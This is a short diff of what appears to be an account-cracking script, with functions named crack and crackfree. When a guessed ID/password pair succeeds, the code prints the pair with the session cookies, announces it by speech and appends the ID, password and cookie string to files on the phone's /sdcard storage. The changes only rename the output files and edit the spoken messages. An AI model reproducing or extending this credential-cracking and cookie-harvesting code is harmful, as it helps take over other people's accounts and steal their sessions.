@@ -630,8 +630,8 @@ def crack(idf,pwv):
                 coki=po.cookies.get_dict()
                 kuki = (";").join([ "%s=%s" % (key, value) for key, value in ses.cookies.get_dict().items() ])
                 print(f'\r\033[0;92m[ANOX-🙆OK] {idf} | {pw}\n\033[0;93m[😎]= \033[0;92m{kuki} ')
-                os.system('espeak -a 300 " ANOX,  Ok,  id"')
-                open('/sdcard/anoxok.txt','a').write(idf+' | '+pw+' | '+kuki+'\n')
+                os.system('espeak -a 300 "  Ok,  id"')
+                open('/sdcard/ANOXOK1.txt','a').write(idf+'|'+pw+'|'+kuki+'\n')
                 break
                 
             else:
@@ -673,7 +673,7 @@ def crackfree(idf,pwv):
                 kuki = (";").join([ "%s=%s" % (key, value) for key, value in ses.cookies.get_dict().items() ])
                 print(f'\r\033[10;92m[{time.strftime("%H:%M")}•Anox-OK] {idf} • {pw} ')
                 os.system('espeak -a 300 " Ok,  ANOX,  id"')
-                open('/sdcard/anoxok.txt','a').write(idf+'|'+pw+'|'+kuki+'n')
+                open('/sdcard/ANXok.txt','a').write(idf+'|'+pw+'|'+kuki+'n')
              
                 break
                 
